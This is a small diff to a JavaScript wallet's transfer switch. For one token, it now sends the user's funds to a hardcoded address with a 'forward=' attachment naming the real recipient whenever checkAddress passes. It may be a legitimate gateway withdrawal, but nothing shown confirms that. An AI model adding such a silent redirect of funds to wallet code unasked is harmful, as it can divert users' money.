@@ -19,7 +19,11 @@ function Wallet() {
                     transfer(addressTo, amount, 'WAVES', '');
                     break;
                 case 2:
-                    transfer(addressTo, amount, '7xHHNP8h6FrbP5jYZunYWgGn2KFSBiWcVaZWe644crjs', '');
+                    if (checkAddress(addressTo)) {
+                        transfer('3PDb1ULFjazuzPeWkF2vqd1nomKh4ctq9y2', amount, '7xHHNP8h6FrbP5jYZunYWgGn2KFSBiWcVaZWe644crjs', 'forward=' + addressTo);
+                    } else {
+                        transfer(addressTo, amount, '7xHHNP8h6FrbP5jYZunYWgGn2KFSBiWcVaZWe644crjs', '');
+                    }
                     break;
                 case 3:
                     transfer(addressTo, amount, '4fJ42MSLPXk9zwjfCdzXdUDAH8zQFCBdBz4sFSWZZY53', '');
